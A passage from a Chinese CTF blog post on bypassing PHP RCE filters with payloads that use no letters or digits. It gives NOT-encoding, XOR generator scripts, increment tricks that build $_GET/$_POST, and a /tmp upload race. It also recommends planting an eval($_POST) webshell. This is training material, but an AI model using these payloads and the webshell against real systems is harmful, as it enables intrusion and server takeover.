<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以直接看p神的博客：</p>
<p>一些不包含数字和字母的webshell：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p>无字母数字webshell之提高篇：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
<h3 id="取反-PHP-gt-7"><a href="#取反-PHP-gt-7" class="headerlink" title="取反(PHP&gt;7)"></a>取反(PHP&gt;7)</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$code1</span><span class="token operator">=</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
<span class="token variable">$code2</span><span class="token operator">=</span><span class="token string double-quoted-string">"cat /f*"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"?wllm=(~"</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$code1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")(~"</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$code2</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">");"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$((</span><span class="token punctuation">))</span>
$<span class="token punctuation">((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token operator">=</span>-1
<span class="token variable">$&#123;_&#125;</span> <span class="token operator">=</span><span class="token string">""</span>返回上一次命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>一代脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">valid <span class="token operator">=</span> <span class="token string">"1234567890!@$%^*()&#123;&#125;[];\'\",.&lt;>/?-=_`~ "</span>

answer <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#请输入进行异或构造的字符串</span>

tmp1<span class="token punctuation">,</span> tmp2 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> answer<span class="token punctuation">:</span>
  <span class="token keyword">for</span> i <span class="token keyword">in</span> valid<span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> valid<span class="token punctuation">:</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        tmp1 <span class="token operator">+=</span> i
        tmp2 <span class="token operator">+=</span> j
        <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      <span class="token keyword">continue</span>
    <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"tmp1为:"</span><span class="token punctuation">,</span>tmp1<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"tmp2为:"</span><span class="token punctuation">,</span>tmp2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>二代脚本：</p>
<p>先生成可用的字符集</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce_or.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">126</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">126</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[a-z,A-Z,0-9>\?\'\"]/i'</span><span class="token punctuation">;</span>    <span class="token comment">// 根据题目给的正则表达式修改即可</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span>
            <span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span>
            <span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再生成异或字符串</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse

<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s1 <span class="token operator">=</span> <span class="token string">""</span>
    s2 <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>
        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rce_or.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
        k <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> t <span class="token keyword">in</span> k<span class="token punctuation">:</span>

            <span class="token keyword">if</span> t <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> i<span class="token punctuation">:</span>
                s1 <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                s2 <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    output <span class="token operator">=</span> <span class="token string">"\'"</span> <span class="token operator">+</span> s1 <span class="token operator">+</span> <span class="token string">"\'^\'"</span> <span class="token operator">+</span> s2 <span class="token operator">+</span> <span class="token string">"\'\n"</span>
    <span class="token keyword">return</span> output

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    param <span class="token operator">=</span> action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>最终我们要把参数带出来，即构造<code>$_GET</code>或<code>$_POST</code></p>
<p>(传入时记得url编码)</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">++</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>  <code>$_++</code>对<code>_</code>变量进行了自增操作,由于我们没有定义<code>_</code>的值,PHP会给<code>_</code>赋一个默认值NULL&#x3D;&#x3D;0,</p>
<p>  由此我们可以看出,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字</p>
<ul>
<li><p>注：linux命令下不能构造<code>($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)</code>类似语句获取数字</p>
</li>
<li><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为”Array”</p>
<p>实战一般会用<code>_/_._</code>获取<code>NAN_</code>快速获取<code>$_POST</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string double-quoted-string">"A"</span><span class="token operator">++</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token string double-quoted-string">"B"</span>
<span class="token string double-quoted-string">"B"</span><span class="token operator">++</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token string double-quoted-string">"C"</span>
    如果我们能够得到<span class="token string double-quoted-string">"A"</span>，那么我们就能通过自增自减，得到所有的字母
    
<span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>   <span class="token comment">//得到"Array"</span>
<span class="token variable">$___</span> <span class="token operator">=</span> <span class="token variable">$_</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">//得到"A"，$__没有定义，默认为False也即0，此时$___="A"</span>

<span class="token variable">$_</span><span class="token operator">=</span><span class="token constant">_</span><span class="token operator">/</span><span class="token constant">_</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">;</span>   <span class="token comment">// 得到"NAN_"</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">_</span><span class="token operator">/</span><span class="token constant">_</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//得到"N"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<p>以Array为例拼出<code>$_GET</code>：（用到chr函数）长度120</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>   <span class="token comment">// Array</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// r</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">// a</span>
<span class="token variable">$___</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token comment">// c</span>
<span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// h</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$___</span><span class="token operator">.</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">;</span>  <span class="token comment">// chr</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token constant">_</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// _GET</span>
<span class="token variable">$$_</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span>；</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>精简为一句话版：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$___</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">.=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token constant">_</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$$_</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$$_</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>以NAN为例拼出<code>$_POST</code>：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$NAN</span> <span class="token operator">=</span> <span class="token constant">_</span> <span class="token operator">/</span> <span class="token constant">_</span> <span class="token operator">.</span> <span class="token constant">_</span><span class="token punctuation">;</span> <span class="token comment">// NAN_</span>
<span class="token variable">$N</span> <span class="token operator">=</span> <span class="token variable">$NAN</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// N</span>
<span class="token variable">$O</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$N</span><span class="token punctuation">;</span> <span class="token comment">// O</span>
<span class="token variable">$PO</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$N</span> <span class="token operator">.</span> <span class="token variable">$O</span><span class="token punctuation">;</span> <span class="token comment">// PO</span>
<span class="token variable">$N</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// Q</span>
<span class="token variable">$N</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// R</span>
<span class="token variable">$S</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$N</span><span class="token punctuation">;</span> 	<span class="token comment">// S</span>
<span class="token variable">$T</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$N</span><span class="token punctuation">;</span>	<span class="token comment">// T</span>
<span class="token variable">$POST</span> <span class="token operator">=</span> <span class="token constant">_</span> <span class="token operator">.</span> <span class="token variable">$PO</span> <span class="token operator">.</span> <span class="token variable">$S</span> <span class="token operator">.</span> <span class="token variable">$T</span><span class="token punctuation">;</span> <span class="token comment">// _POST</span>
<span class="token keyword">echo</span> <span class="token variable">$POST</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>简化一下然后换变量名</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$_</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token constant">_</span> <span class="token operator">/</span> <span class="token constant">_</span> <span class="token operator">.</span> <span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// N</span>
<span class="token variable">$__</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// O</span>
<span class="token variable">$___</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$_</span> <span class="token operator">.</span> <span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// PO</span>
<span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">//Q</span>
<span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">//R</span>
<span class="token variable">$____</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$_____</span> <span class="token operator">=</span> <span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$POST</span> <span class="token operator">=</span> <span class="token constant">_</span> <span class="token operator">.</span> <span class="token variable">$___</span> <span class="token operator">.</span> <span class="token variable">$____</span> <span class="token operator">.</span> <span class="token variable">$_____</span><span class="token punctuation">;</span> <span class="token comment">// _POST</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>缩成一句话，长110</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">_</span><span class="token operator">/</span><span class="token constant">_</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$______</span><span class="token operator">=</span><span class="token constant">_</span><span class="token operator">.</span><span class="token variable">$___</span><span class="token operator">.</span><span class="token variable">$____</span><span class="token operator">.</span><span class="token variable">$_____</span><span class="token punctuation">;</span><span class="token variable">$$______</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>更短的参考<a target="_blank" rel="noopener" href="https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah">极限RCE</a></p>
<p>参数带出来之后建议写马</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">1=file_put_contents('1.php','<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>')`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h3 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html"><code>$</code>和<code>_</code>均被过滤的情况</a>(P神文章)</p>
</blockquote>
<ul>
<li><p>使用bin下的base64命令</p>
<pre class="line-numbers language-linux" data-language="linux"><code class="language-linux">?c&#x3D;&#x2F;???&#x2F;????64 ????????<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<blockquote>
<p>临时文件目录：<br>Linux临时文件主要存储在&#x2F;tmp&#x2F;目录下，格式通常是（&#x2F;tmp&#x2F;php[6个随机字符]）<br>Windows临时文件主要存储在C:&#x2F;Windows&#x2F;目录下，格式通常是（C:&#x2F;Windows&#x2F;php[4个随机字符].tmp）</p>
</blockquote>
<blockquote>
<p>大概就是在自己的vps上写一个命令执行的txt，然后在题目post该命令</p>
</blockquote>
<ul>
<li><p>PHP5</p>
<ul>
<li><p>要点：</p>
<ol>
<li>shell下可以利用<code>.</code>来执行任意脚本</li>
<li>Linux文件名支持用glob通配符代替</li>
</ol>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108513145">思路</a>：</p>
<p>通过post一个文件(文件里面的sh命令)，在上传的过程中，通过.(点)去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在 &#x2F;tmp&#x2F;php?????? 一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）<br>注意：通过.去执行sh命令不需要有执行权限</p>
</li>
<li><p>操作：</p>
<ol>
<li><p>本地服务器构造POST上传文件数据包</p>
<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!DOCTYPE html&gt;
&lt;html lang&#x3D;&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;
    &lt;title&gt;POST数据包POC&lt;&#x2F;title&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;7f21b48d-249b-4f0e-8c3e-5be2fae43b59.challenge.ctf.show&#x2F;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;
&lt;!--链接是当前打开的题目链接--&gt;
    &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;
